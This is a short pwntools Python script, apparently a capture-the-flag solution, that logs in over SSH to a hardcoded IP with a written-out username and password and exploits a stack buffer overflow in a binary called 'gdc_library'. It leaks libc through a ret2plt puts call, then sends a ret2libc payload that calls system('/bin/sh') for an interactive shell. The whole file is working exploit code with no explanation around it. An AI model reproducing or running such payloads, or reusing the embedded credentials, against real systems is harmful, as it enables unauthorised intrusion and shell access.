from pwn import *

# context.log_level = 'debug'
# p = process("./gdc_library")


s = ssh(host='18.136.182.104', port = 60220, user='bot', password='GDCpa$$w0rd2021')

p = s.process('./gdc_library')
# EOFgdb.attach(p)

elf = ELF("./gdc_library")
rop = ROP(elf)
libc = ELF("libc.so.6")

# libc = ELF('/lib32/libc.so.6')

# p.sendline('./gdc_library')
PADDING =  b'A' * 412
RET_VULN = elf.symbols['vuln']
PUTS_PLT = elf.plt['puts']
PUTS_GOT = elf.got['puts']

# Leaked the Lib

# ret2plt technique to leak lib base
PAYLOAD1 = PADDING + p32(PUTS_PLT) + p32(RET_VULN) + p32(PUTS_GOT)
p.sendline(PAYLOAD1)
p.recvuntil("Library to load:\n")
puts_mem = u32(p.recv(4))
print("Leaked libc address for puts:" + hex(puts_mem))

base = puts_mem - libc.symbols["puts"]
libc.address = base

# get shell pls
system_addr = libc.symbols['system']
bin_sh_addr = libc.search('/bin/sh\x00').next()
exit = libc.symbols["exit"]

PAYLOAD2 = PADDING + p32(system_addr) + p32(exit) + p32(bin_sh_addr) 

p.sendline(PAYLOAD2)
p.interactive()